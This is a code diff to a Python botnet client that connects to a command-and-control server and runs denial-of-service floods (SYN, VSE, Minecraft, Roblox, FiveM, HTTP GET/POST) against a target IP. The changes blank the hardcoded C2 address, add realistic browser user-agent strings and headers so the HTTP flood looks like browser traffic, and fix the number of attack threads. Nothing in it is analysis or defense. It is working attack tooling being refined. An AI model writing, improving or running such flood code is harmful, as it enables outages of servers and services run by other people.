@@ -4,7 +4,7 @@ import time
 import random
 
 # Configuration
-C2_ADDRESS  = '216.172.177.16'
+C2_ADDRESS  = ""
 C2_PORT     = 101
 
 base_user_agents = [
@@ -13,6 +13,9 @@ base_user_agents = [
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
 ]
 
 def rand_ua():
@@ -115,18 +118,26 @@ def attack_http_post(ip, port, secs):
 def attack_browser(ip, port, secs):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
         try:
             s.connect((ip, port))
-            while time.time() < secs:
-                request = (f'GET / HTTP/1.1\r\n'
-                           f'Host: {ip}\r\n'
-                           f'User-Agent: {rand_ua()}\r\n'
-                           f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
-                           f'Accept-Language: en-US,en;q=0.5\r\n'
-                           f'Connection: keep-alive\r\n'
-                           f'Upgrade-Insecure-Requests: 1\r\n\r\n')
-                s.send(request.encode())
+            request = (f'GET / HTTP/1.1\r\n'
+                       f'Host: {ip}\r\n'
+                       f'User-Agent: {rand_ua()}\r\n'
+                       f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
+                       f'Accept-Encoding: gzip, deflate, br\r\n'
+                       f'Accept-Language: en-US,en;q=0.5\r\n'
+                       f'Connection: keep-alive\r\n'
+                       f'Upgrade-Insecure-Requests: 1\r\n'
+                       f'Cache-Control: max-age=0\r\n'
+                       f'Pragma: no-cache\r\n\r\n')
+            
+            s.sendall(request.encode())
+            response = s.recv(4096)
+            
         except Exception as e:
+            pass
+        finally:
             s.close()
 
 def lunch_attack(method, ip, port, secs):
@@ -137,7 +148,7 @@ def lunch_attack(method, ip, port, secs):
         '.SYN': attack_syn,
         '.VSE': attack_vse,
         '.MCPE': attack_mcpe,
-        '.ROBLOX': attack_roblox,
+        '.ROBLOX': attack_roblox, # HEXadecimal Flood
         '.FIVEM': attack_fivem,
         '.HTTPGET': attack_http_get,
         '.HTTPPOST': attack_http_post,
@@ -186,9 +197,8 @@ def main():
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
-                threads = int(args[4])
 
-                for _ in range(threads):
+                for _ in range(4):
                     threading.Thread(target=lunch_attack, args=(method, ip, port, secs), daemon=True).start()
         except:
             break
